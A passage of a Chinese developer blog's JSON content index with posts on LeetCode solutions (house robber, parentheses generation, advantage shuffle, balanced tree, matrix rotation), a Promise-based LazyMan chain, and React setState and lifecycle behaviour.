偷窃 1 号房屋 (金额 = 1) ，然后偷窃 3 号房屋 (金额 = 3)。 偷窃到的最高金额 = 1 + 3 = 4 。 示例 2: 输入: [2,7,9,3,1]输出: 12解释: 偷窃 1 号房屋 (金额 = 2), 偷窃 3 号房屋 (金额 = 9)，接着偷窃 5 号房屋 (金额 = 1)。 偷窃到的最高金额 = 2 + 9 + 1 = 12 。 这道题是一道很简单却又是很经典的动态规划，其大体的过程就是维护一个记忆数组dp，dp[i]表示截止到第i家房屋可以偷到的最大金额。 举个例子：[1, 2, 3]，截止到第一家，能偷到的最大金额当然就是1，截止到第二家，偷到的最大金额就是1和2的最大值，当然就是2，而偷到第三家时，无非有两种选择，偷第二家或者偷第一家和第三家。这个例子下两种选择可偷的金额分别是2和4，所以截止到第三家，可以偷到的最大金额就是4。 有了这个过程，我们只需要初始化dp数组的前两项，之后的项使用dp[i] = Math.max(dp[i - 1], dp[i - 2] + nums[i])更新即可 代码如下：12345678910111213141516var rob = function(nums) &#123; let len = nums.length, dp = new Array(len) if(len === 0) return 0 if(len === 1) return nums[0] if(len === 2) return Math.max(nums[0], nums[1]) dp[0] = nums[0] dp[1] = Math.max(nums[0], nums[1]) for(let i = 2; i &lt; len; i++)&#123; dp[i] = Math.max(dp[i - 1], dp[i - 2] + nums[i]) &#125; return dp[len - 1]&#125;; 打家劫舍2（难度：中等）题目和之前一样，唯一的不同是，现在第一家和最后一家是相连的，所有屋子连成了一个圈，依然遵守老规则 那么核心原则就是：第一个和最后一个不能同时抢。 所以：要么不抢第一个，要么不抢最后一个。 所以其实就是把环拆成两个队列，一个是从0到n-1，另一个是从1到n，然后返回两个结果最大的。 代码如下;123456789101112131415161718192021var rob1 = function(nums) &#123; let len = nums.length, dp = new Array(len) if(len === 0) return 0 if(len === 1) return nums[0] if(len === 2) return Math.max(nums[0], nums[1]) dp[0] = nums[0] dp[1] = Math.max(nums[0], nums[1]) for(let i = 2; i &lt; len; i++)&#123; dp[i] = Math.max(dp[i - 1], dp[i - 2] + nums[i]) &#125; return dp[len - 1]&#125;;var rob = function(nums) &#123; if(nums.length === 1) return nums[0] return Math.max(rob1(nums.slice(0, nums.length - 1)), rob1(nums.slice(1, nums.length)))&#125;;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"lazyman的promise实现","slug":"lazyman的promise实现","date":"2020-04-08T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/04/09/lazyman的promise实现/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/09/lazyman%E7%9A%84promise%E5%AE%9E%E7%8E%B0/","excerpt":"原题目要求 实现一个lazyman: 1lazy('tom').eat('apple').sleetFirst(1).eat('water').sleep(1).eat('奥利给') 输出:睡了一分钟我的名字叫tom吃了个苹果喝了点水睡了一分钟吃了奥利给","text":"原题目要求 实现一个lazyman: 1lazy('tom').eat('apple').sleetFirst(1).eat('water').sleep(1).eat('奥利给') 输出:睡了一分钟我的名字叫tom吃了个苹果喝了点水睡了一分钟吃了奥利给 核心抽离我们现在先抛开题目本身，将核心功能抽离出来，假设现在有三个活动 123456789101112let a = function()&#123; console.log(1)&#125;let b = function()&#123; setTimeout(() =&gt; &#123; console.log(2) resolve() &#125;, 0)&#125;let c = function()&#123; console.log(3)&#125; 我们依次执行他们：123a()b()c()最后输出：132 对于上述三个活动，我要实现他们的顺序执行，可以利用promise的链式调用原理，因为Promise的链式调用可以严格遵循调用时候的顺序 既然要支持链式调用，那么我们让每一个活动返回一个Promise对象，那么三个活动就可以作出如下修改1234567891011121314151617181920212223let a = function()&#123; return new Promise(function(resolve)&#123; console.log(1) resolve() &#125;)&#125;let b = function()&#123; return new Promise(function(resolve)&#123; setTimeout(() =&gt; &#123; console.log(2) resolve() &#125;, 1000) &#125;)&#125;let c = function()&#123; return new Promise(function(resolve)&#123; console.log(3) &#125;)&#125;然后就可以再用一个promise将上面三个活动包起来，以下面这样的形式进行调用：123456789101112new Promise(function(resolve)&#123; resolve()&#125;).then(function()&#123; return a()&#125;).then(function()&#123; return b()&#125;).then(function()&#123; return c()&#125;)输出结果：123 具体实现了核心功能的实现之后，就可以进行代码编写 首先是函数主体部分：1234567891011121314151617181920function lazyman(name)&#123; return new _lazyman(name)&#125;function _lazyman(name)&#123; let flag = Promise.resolve() this.name = name this.fun_stack = [] let self = this function fn()&#123; console.log('我的名字是' + self.name) return Promise.resolve() &#125; this.fun_stack.push(fn) setTimeout(function()&#123; self.fun_stack.forEach(fn =&gt; &#123; flag = flag.then(fn) &#125;) &#125;)&#125; 这里使用的flag就相当于充当了所有活动最外层包裹的Promise，用于实现链式调用的顺序执行fun_stack用于将活动暂存，因为有FirstSleep与sleep的存在，所以不能一调用事物就立即执行，需要进行暂存在清空fun_stack时使用了setTimeout，是因为要等到链式完整书写完才能执行，否则会出现链式调用无法运行 接下来是睡觉部分首先是sleep1234567891011121314_lazyman.prototype.sleep = function(time)&#123; function fn()&#123; return new Promise(function(resolve)&#123; console.log('开始睡午觉') setTimeout(function()&#123; console.log('午觉睡醒了') resolve() &#125;, time * 1000) &#125;) &#125; this.fun_stack.push(fn) return this&#125;sleepFirst实现和sleep几乎一样，唯一的不同是入队列时要压到队列最前方，保证链式调用时优先执行 1234567891011121314_lazyman.prototype.sleepFirst = function(time)&#123; function fn()&#123; return new Promise(function(resolve)&#123; console.log('开始睡觉') setTimeout(function()&#123; console.log('睡醒了') resolve() &#125;, time * 1000) &#125;) &#125; this.fun_stack.unshift(fn) return this&#125; 吃东西部分12345678_lazyman.prototype.eat = function(food)&#123; function fn()&#123; console.log('正在吃' + food) return Promise.resolve() &#125; this.fun_stack.push(fn) return this&#125; 这部分没有一部代码，因此直接使用Promise.resolve()返回一个已经resolve的Promise对象 运行效果1lazyman('怪鸽~').sleepFirst(1).eat('奥利给').sleep(2).eat('老八秘制小汉堡') 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960function lazyman(name)&#123; return new _lazyman(name)&#125;function _lazyman(name)&#123; let flag = Promise.resolve() this.name = name this.fun_stack = [] let self = this function fn()&#123; console.log('我的名字是' + self.name) return Promise.resolve() &#125; this.fun_stack.push(fn) setTimeout(function()&#123; self.fun_stack.forEach(fn =&gt; &#123; flag = flag.then(fn) &#125;) &#125;)&#125;_lazyman.prototype.sleep = function(time)&#123; let self = this function fn()&#123; return new Promise(function(resolve)&#123; console.log(self.name + '开始睡午觉') setTimeout(function()&#123; console.log(self.name + '午觉睡醒了') resolve() &#125;, time * 1000) &#125;) &#125; this.fun_stack.push(fn) return this&#125;_lazyman.prototype.sleepFirst = function(time)&#123; let self = this function fn()&#123; return new Promise(function(resolve)&#123; console.log(self.name + '开始睡觉') setTimeout(function()&#123; console.log(self.name + '睡醒了') resolve() &#125;, time * 1000) &#125;) &#125; this.fun_stack.unshift(fn) return this&#125;_lazyman.prototype.eat = function(food)&#123; let self = this function fn()&#123; console.log(self.name + '正在吃' + food) return Promise.resolve() &#125; this.fun_stack.push(fn) return this&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"leetcode-括号生成","slug":"leetcode-括号生成","date":"2020-04-08T16:00:00.000Z","updated":"2024-05-25T02:28:45.254Z","comments":true,"path":"2020/04/09/leetcode-括号生成/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/09/leetcode-%E6%8B%AC%E5%8F%B7%E7%94%9F%E6%88%90/","excerpt":"括号生成(难度：中等)数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。 输入：n = 3输出：[ “((()))”, “(()())”, “(())()”, “()(())”, “()()()” ] 这道题的比较好的解法就是深搜+回溯的算法。我们设置一个path用于保存路径，那么递归的终点就显而易见了：当path的长度为n的两倍，那么这个时候就代表已经找出了一条符合要求的解，直接保存下来就可以了。 当path长度小于n的两倍，说明还可以往里面放括号，这个时候有两种情况，左括号的数量小于n，说明这个时候还可以继续放左括号。第二种情况，右括号的数量小于左括号的数量，说明这个时候可以放右括号。需要注意的是，这两种情况不是互斥的，而是需要顺序执行 那么我们就可以对放左括号和右括号进行递归，为了实现回溯，我们每一次递归完，都需要回退当前情况下的path和左右括号的放置情况","text":"括号生成(难度：中等)数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。 输入：n = 3输出：[ “((()))”, “(()())”, “(())()”, “()(())”, “()()()” ] 这道题的比较好的解法就是深搜+回溯的算法。我们设置一个path用于保存路径，那么递归的终点就显而易见了：当path的长度为n的两倍，那么这个时候就代表已经找出了一条符合要求的解，直接保存下来就可以了。 当path长度小于n的两倍，说明还可以往里面放括号，这个时候有两种情况，左括号的数量小于n，说明这个时候还可以继续放左括号。第二种情况，右括号的数量小于左括号的数量，说明这个时候可以放右括号。需要注意的是，这两种情况不是互斥的，而是需要顺序执行 那么我们就可以对放左括号和右括号进行递归，为了实现回溯，我们每一次递归完，都需要回退当前情况下的path和左右括号的放置情况 代码如下： 123456789101112131415161718192021222324252627282930313233var generateParenthesis = function(n) &#123; let res = [], arr = new Array(n) for(let i = 0; i &lt; n; i++)&#123; arr[i] = '(' &#125; dfs(n, res, [], [], []) return res.map(v =&gt; &#123; return v.join('') &#125;)&#125;;function dfs(n, res, path, left, right)&#123; if(path.length === n * 2)&#123; res.push(JSON.parse(JSON.stringify(path))) return 0 &#125; if(left.length &lt; n)&#123; path.push('(') left.push('(') dfs(n, res, path, left, right) path.pop() left.pop() &#125; if(right.length &lt; left.length)&#123; path.push(')') right.push(')') dfs(n, res, path, left, right) path.pop() right.pop() &#125; &#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"leetcode-田忌赛马","slug":"leetcode-田忌赛马","date":"2020-04-08T16:00:00.000Z","updated":"2024-05-25T02:28:45.255Z","comments":true,"path":"2020/04/09/leetcode-田忌赛马/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/09/leetcode-%E7%94%B0%E5%BF%8C%E8%B5%9B%E9%A9%AC/","excerpt":"田忌赛马（难度：中等）给定两个大小相等的数组 A 和 B，A 相对于 B 的优势可以用满足 A[i] &gt; B[i] 的索引 i 的数目来描述。 返回 A 的任意排列，使其相对于 B 的优势最大化。 示例 1： 输入：A = [2,7,11,15], B = [1,10,4,11]输出：[2,11,7,15] 示例 2： 输入：A = [12,24,8,32], B = [13,25,32,11]输出：[24,32,8,12] 这道题是一个很经典的贪心算法题，其核心思想也很简单：","text":"田忌赛马（难度：中等）给定两个大小相等的数组 A 和 B，A 相对于 B 的优势可以用满足 A[i] &gt; B[i] 的索引 i 的数目来描述。 返回 A 的任意排列，使其相对于 B 的优势最大化。 示例 1： 输入：A = [2,7,11,15], B = [1,10,4,11]输出：[2,11,7,15] 示例 2： 输入：A = [12,24,8,32], B = [13,25,32,11]输出：[24,32,8,12] 这道题是一个很经典的贪心算法题，其核心思想也很简单： A当前最小值如果比B的当前最小值要大，就让这两个最小值配对。否则A当前最小值和B当前最大值配对，作用是以最小的代价消耗B中的大的部分。让每一个A中的值都发挥最大效用 代码如下： 1234567891011121314151617181920212223242526272829303132333435363738var advantageCount = function(A, B) &#123; let a = JSON.parse(JSON.stringify(A)), b = JSON.parse(JSON.stringify(B)) a = a.sort(function(pre, next)&#123; if(pre &gt; next)&#123; return 1 &#125; else&#123; return -1 &#125; &#125;) b = b.sort(function(pre, next)&#123; if(pre &gt; next)&#123; return 1 &#125; else&#123; return -1 &#125; &#125;) let res = [] while(b.length &gt; 0)&#123; if(a[0] &gt; b[0])&#123; let flag = B.lastIndexOf(b[0]) res[flag] = a[0] B[flag] = NaN a.shift() b.shift() &#125; else&#123; let flag = B.lastIndexOf(b[b.length - 1]) res[flag] = a[0] B[flag] = NaN a.shift() b.pop() &#125; &#125; return res&#125;;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"setState之后发生了什么","slug":"setState之后发生了什么","date":"2020-04-07T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/04/08/setState之后发生了什么/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/08/setState%E4%B9%8B%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/","excerpt":"流程图","text":"流程图 partialState：setState传入的第一个参数，对象或函数 _pendingStateQueue：当前组件等待执行更新的state队列 isBatchingUpdates：react用于标识当前是否处于批量更新状态，所有组件公用 dirtyComponent：当前所有处于待更新状态的组件队列 transcation：react的事务机制，在被事务调用的方法外包装n个waper对象，并一次执行：waper.init、被调用方法、waper.close FLUSH_BATCHED_UPDATES：用于执行更新的waper，发起组件更新。只有一个close方法 两类setState1、批量更新类：即react内部的执行函数，执行setState的执行逻辑，都是批量更新处理，其中包括：react内部事件(合成事件)和生命周期； 2、非批量更新类：即上面两种情况以外的情况，经常见到的：原生事件、setTimeout、fetch等等； 先说明两个概念： 1、事务：可以理解为，一个正常的函数外层又被包裹了一层。这层包裹处理，包括一个或多个的函数执行前的处理函数(initialize函数)、一个和多个函数执行后的处理函数(close函数)；React很多的逻辑处理，都使用了事务的概念； 2、合成事件和原生事件的关系和区别： 区别：原生事件就是addEventListener写法的事件！而合成事件，就是直接书写react中的onClick、onChange等； 关系：合成事件可以理解为react对原生事件的包裹封装；原生事件相当于上面事务概念中的正常的函数，而经过包装处理形成的事务，就是react中的合成事件。.对于两种情况下的setState有两种不同的执行顺序： 对于批量更新分支，大概的流程如下 1.将setState传入的partialState参数存储在当前组件实例的state暂存队列中。2.判断当前React是否处于批量更新状态，如果是，将当前组件加入待更新的组件队列中。3.如果未处于批量更新状态，将批量更新状态标识设置为true，用事务再次调用前一步方法，保证当前组件加入到了待更新组件队列中。4.调用事务的waper方法，关闭批量更新，发起组件更新。遍历待更新组件队列依次执行更新。5.执行生命周期componentWillReceiveProps。6.将组件的state暂存队列中的state进行合并，获得最终要更新的state对象，并将队列置为空。7.执行生命周期componentShouldUpdate，根据返回值判断是否要继续更新。8.执行生命周期componentWillUpdate。9.执行真正的更新，render。10.执行生命周期componentDidUpdate。 总结在合成事件和生命周期中在react的生命周期和合成事件中，react仍然处于他的更新机制中，这时isBranchUpdate为true。 按照上述过程，这时无论调用多少次setState，都会不会执行更新，而是将要更新的state存入_pendingStateQueue，将要更新的组件存入dirtyComponent。 当上一次更新机制执行完毕，以生命周期为例，所有组件，即最顶层组件didmount后会将isBranchUpdate设置为false。这时将执行之前累积的setState。 在原生事件和异步函数中由执行机制看，setState本身并不是异步的，而是如果在调用setState时，如果react正处于更新过程，当前更新会被暂存，等上一次更新执行后在执行，这个过程给人一种异步的假象。 在生命周期，根据JS的异步机制，会将异步函数先暂存，等所有同步代码执行完毕后在执行，这时上一次更新过程已经执行完毕，isBranchUpdate被设置为false，根据上面的流程，这时再调用setState即可立即发起更新，拿到更新结果。 partialState合并机制如果传入的是对象，很明显会被合并成一次： 12345Object.assign( nextState, &#123;index: state.index+ 1&#125;, &#123;index: state.index+ 1&#125;) 如果传入的是函数，函数的参数preState是前一次合并后的结果，所以计算结果是准确的 关于callback我们知道setState可以给第二个参数传递一个函数，用作回调函数。这个回调函数在批量更新下也是会进行收集，收集的时间点和state一样。收集之后会在后续的组件reRender之后进行统一执行","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"React","slug":"技术/前端/React","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/React/"}],"tags":[]},{"title":"总结react生命周期","slug":"总结react生命周期","date":"2020-04-07T16:00:00.000Z","updated":"2024-05-25T04:21:29.360Z","comments":true,"path":"2020/04/08/总结react生命周期/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/08/%E6%80%BB%E7%BB%93react%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","excerpt":"生命周期大体流程","text":"生命周期大体流程 初始化步骤初始进入页面 → constructor → componentWillMount → render → componentDidMount → componentWillUnmount； 下面的图中，加了一些的状态说明，提前说明一下：_compositeLifeCycleState翻译为：综合生命周期状态(下文简称：生命状态)，它是生命周期中关键的状态，setState是否出发更新，就是依据它的状态 1、首先，进入页面，会初始化页面数据(state, props, context等…)，等待备用； 2、然后，设置生命状态为：MOUNTING，这个状态下面会说明它的用途，这里我们先按照流程继续往下走； 3、接下来，在componentWillMount中，setState操作，只是把state合并到初始化状态中，而根本不会触发render ；在这里更新state，就等同于直接写在this.state中，所以，在此生命周期中的setState根本没有意义； 4、执行到这里，生命状态会被重置为 null，之后是渲染页面(即执行render)； 5、最后，渲染完以后，执行componentDidMount，这里使用setState即会正常触发重新渲染了，更新state。(接下来，就是更新流程了！！) 更新 setState发起更新流程，并不是每个生命周期中的setState都会触发跟新，它判断的依据就是 _compositeLifeCycleState ，上面说到的MOUNTING和下面将会讲到的RECEIVE_PROPS，在这两个状态下，react会处理setState为不会触发更新，相对的其他状态会正常更新；这也导致了一些生命周期中的使用情况 1、首先，react会比较前后元素、状态等是否不同，如果不同则正式发起更新； 2、然后，生命状态 被设置为RECEIVE_PROPS(注意：此时生命周期中，setState不会触发更新，而是会做其他处理； 3、接下来，componentWillReceiveProps中的setState就不会执行更新，而是合并挂载起来，等待render时统一更新； 4、到这里，生命状态 会重置为null；然后shouldComponentUpdate中会判断是否更新；之后是componentWillUpdate。 注意：shouldComponentUpdate和componentWillUpdate执行的时候，生命状态 已经被重置为null，在它们里面的setState会触发更新，那么在其间使用呢？会造成什么？答案就是：在一个更新周期还没有render之前，再次发起updateComponent，直接导致递归更新死循环，造成浏览器卡死。所以在他们里面🚫禁止🚫使用setState。 5、最后，渲染页面；再执行componentDidUpdate；它里面执行setState，会触发更新，不同的是render完成之后再发起的reRender。虽然这儿区别于上面两个生命周期中使用的情况，但是会一遍一遍的更新，可以依靠shouldComponentUpdate进行控制 最后呢，简单介绍一下，退出页面的流程。此流程中， 首先生命状态也会被赋予值为UNMOUNTING， 然后执行componentWillUnmount，最后生命状态重置为null，做卸载页面组件和状态等处理。顺便提一下，在componentWillUnmount中使用setStat，因为等待的是页面卸载，所以改变state是没有意义的。 异步获取数据componentWillMount的问题在componentWillMount中执行this.setState是不会触发二次渲染的。 它也只会在挂载过程中被调用一次，它的作用和constructor没有太大差异。有很多人在componentWillMount中请求后台数据，认为这样可以更早的得到数据，但是componentWillMout是在render函数执行前执行的，虽然请求是在第一次render之前发送的，但是返回并不能保证在render之前完成。render不会等你慢慢请求。所以当数据到来时组件已经完成首次的渲染，而在这个生命周期当中setState又不会触发reRender，所以会出现请求的数据无法正常渲染。 componentdidmount的优点在生产时,componentDidMount生命周期函数是最好的时间去请求数据,其中最重要原因:使用componentDidMount第一个好处就是这个一定是在组件初始化完成之后,再会请求数据,因此不会报什么警告或者错误,我们正常请教数据完成之后一般都会setState. 使用总结生命周期中setState的使用情况： 无意义使用：componentWillMount，componentWillUnmount； 有条件使用：componentDidUpdate； 禁止使用：componentWillUpdate，shouldComponentUpdate； 正常使用：componentWIllReceiveProps，componentDidMount。 生命周期中setState是否触发更新： componentWillMount和componentWillReceiveProps中，setState会被react内部处理，而不触发render；其他生命周期均正常出发更新渲染。 react V16.4版本生命周期原来（React v16.0前）的生命周期在React v16推出的Fiber之后就不合适了，因为如果要开启async rendering，在render函数之前的所有函数，都有可能被执行多次。 上文我们已经知道，下面这些生命周期是在render之前执行的： componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate react V16版本使用的fiber架构中，将上述生命周期归为了同一个阶段：调和阶段。调和阶段的生命周期在实际组件的渲染过程中，有一定几率会发生多次调用，这取决于fiber架构当中对于时间片的控制，如果在画面的1帧的时间之内不能快速完成运算，生命周期中执行的JS线程会被打断，优先渲染页面防止页面卡顿。被打断的生命周期会在之后从头执行。 禁止用比劝导开发者不要这样用的效果更好，所以除了shouldComponentUpdate，其他在render函数之前的所有函数（componentWillMount，componentWillReceiveProps，componentWillUpdate）都被getDerivedStateFromProps替代。 getDerivedStateFromProps随着getDerivedStateFromProps的推出，同时deprecate了一组生命周期API，包括： componentWillReceiveProps componentWillMount componentWillUpdate 也就是用一个静态函数getDerivedStateFromProps来取代被deprecate的几个生命周期函数，就是强制开发者在render之前只做无副作用的操作，而且能做的操作局限在根据props和state决定新的state 这个getDerivedStateFromProps是一个静态函数，所以函数体内不能访问this，简单说，就是应该一个纯函数，纯函数是一个好东西啊，输出完全由输入决定。 123static getDerivedStateFromProps(nextProps, prevState) &#123; //根据nextProps和prevState计算出预期的状态改变，返回结果会被送给setState&#125; getSnapshotBeforeUpdateReact v16.4还具有了一个新的声明周期函数getSnapshotBeforeUpdate，这函数会在render之后执行，而执行之时DOM元素还没有被更新，给了一个机会去获取DOM信息，计算得到一个snapshot，这个snapshot会作为componentDidUpdate的第三个参数传入。 12345678getSnapshotBeforeUpdate(prevProps, prevState) &#123; console.log('#enter getSnapshotBeforeUpdate'); return 'foo';&#125;componentDidUpdate(prevProps, prevState, snapshot) &#123; console.log('#enter componentDidUpdate snapshot = ', snapshot);&#125; 上面这段代码可以看出来这个snapshot怎么个用法，snapshot咋看还以为是组件级别的某个“快照”，其实可以是任何值，到底怎么用完全看开发者自己，getSnapshotBeforeUpdate把snapshot返回，然后DOM改变，然后snapshot传递给componentDidUpdate。 官方给了一个例子，用getSnapshotBeforeUpdate来处理scroll，坦白说，我也想不出其他更常用更好懂的需要getSnapshotBeforeUpdate的例子，这个函数应该大部分开发者都用不上 react 16.4生命周期图总结一下：用一个静态函数getDerivedStateFromProps来取代被deprecate的几个生命周期函数，就是强制开发者在render之前只做无副作用的操作，而且能做的操作局限在根据props和state决定新的state，而已。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"React","slug":"技术/前端/React","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/React/"}],"tags":[]},{"title":"leetcode-平衡二叉树","slug":"leetcode-平衡二叉树","date":"2020-04-06T16:00:00.000Z","updated":"2024-05-25T02:28:45.253Z","comments":true,"path":"2020/04/07/leetcode-平衡二叉树/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/07/leetcode-%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/","excerpt":"平衡二叉树（难度：简单）给定一个二叉树，判断它是否是高度平衡的二叉树。 本题中，一棵高度平衡二叉树定义为：一个二叉树每个节点的左右两个子树的高度差的绝对值不超过1。 这道题可以想到的最简单得方法是从根节点递归遍历二叉树，对于遍历到的节点依次对左右子树求二叉树的深度，然后对比两个深度之差，若超过1，则不是平衡二叉树。但这样做的问题依然是递归过程会产生大量的重复计算，时间复杂度是O(n * logn)。 因此这道题可以反过来想，从底向上遍历二叉树，这样就不会产生重复的计算。我们使用后序遍历的思想，先遍历当前根节点的左右子树，这样就可以求得当前根节点的深度以及直到当前根节点所在的子树是不是平衡二叉树，然后当前根节点遍历的结果又可以作为它的父亲节点计算的依据，实现一个从下往上的计算。","text":"平衡二叉树（难度：简单）给定一个二叉树，判断它是否是高度平衡的二叉树。 本题中，一棵高度平衡二叉树定义为：一个二叉树每个节点的左右两个子树的高度差的绝对值不超过1。 这道题可以想到的最简单得方法是从根节点递归遍历二叉树，对于遍历到的节点依次对左右子树求二叉树的深度，然后对比两个深度之差，若超过1，则不是平衡二叉树。但这样做的问题依然是递归过程会产生大量的重复计算，时间复杂度是O(n * logn)。 因此这道题可以反过来想，从底向上遍历二叉树，这样就不会产生重复的计算。我们使用后序遍历的思想，先遍历当前根节点的左右子树，这样就可以求得当前根节点的深度以及直到当前根节点所在的子树是不是平衡二叉树，然后当前根节点遍历的结果又可以作为它的父亲节点计算的依据，实现一个从下往上的计算。代码如下：1234567891011121314151617181920function isBalanced1(root, arr)&#123; if(root === null)&#123; arr[0] = 0 return true &#125; let par = [[0],[0]] if(isBalanced1(root.left, par[0]) &amp;&amp; isBalanced1(root.right, par[1]))&#123;//先遍历左右子树 if(Math.abs(par[0][0] - par[1][0]) &lt;= 1)&#123; //同时判断当前根节点组成的子树是不是平衡二叉树 arr[0] = 1 + Math.max(par[0][0], par[1][0])//再更新当前根节点的深度 return true &#125; &#125; return false&#125;function isBalanced(root) &#123; var arr = new Array(1) arr[0] = 0 return isBalanced1(root, arr)&#125;;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"计算机通识","slug":"技术/计算机通识","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/"},{"name":"数据结构与算法","slug":"技术/计算机通识/数据结构与算法","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%80%9A%E8%AF%86/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"leetcode-旋转数组","slug":"leetcode-旋转数组","date":"2020-04-06T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/04/07/leetcode-旋转数组/","link":"","permalink":"https://wtaufpziv.github.io/2020/04/07/leetcode-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84/","excerpt":"旋转矩阵（难度：中等）给你一幅由 N × N 矩阵表示的图像，其中每个像素的大小为 4 字节。请你设计一种算法，将图像旋转 90 度。不占用额外内存空间能否做到？","text":"旋转矩阵（难度：中等）给你一幅由 N × N 矩阵表示的图像，其中每个像素的大小为 4 字节。请你设计一种算法，将图像旋转 90 度。不占用额外内存空间能否做到？ 题解：对于下面这个数组先由对角线进行翻转：然后再对每一行进行翻转，就得到了 代码如下： 1234567891011121314var rotate = function(matrix) &#123; let len = matrix.length for(let i = 0; i &lt; len; i++)&#123; for(let j = 0; j &lt; i; j++)&#123; let flag = matrix[i][j] matrix[i][j] = matrix[j][i] matrix[j][i] = flag &#125; &#125; for(let i = 0; i &lt; len; i++)&#123; matrix[i].reverse() &#125; return 